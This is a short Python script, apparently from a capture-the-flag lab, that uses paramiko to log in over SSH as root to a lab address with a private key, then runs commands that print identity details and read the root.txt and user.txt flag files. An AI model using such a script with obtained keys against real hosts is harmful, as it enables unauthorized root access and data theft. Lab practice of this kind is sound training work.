import paramiko, sys, traceback

paramiko.util.log_to_file("/home/kali/nexus/paramiko_debug.log")

key = paramiko.Ed25519Key.from_private_key_file("/home/kali/nexus/keys/nexus_root")

t = paramiko.Transport(("10.129.12.96", 22))
t.set_keepalive(5)
try:
    t.start_client(timeout=20)
    print("KEX done, server key:", t.get_remote_server_key())
    t.auth_publickey("root", key)
    print("auth success:", t.is_authenticated())
    chan = t.open_session()
    chan.exec_command("id; hostname; cat /root/root.txt; cat /home/jones/user.txt")
    import time
    time.sleep(2)
    print(chan.recv(4096).decode())
except Exception as e:
    traceback.print_exc()
finally:
    t.close()
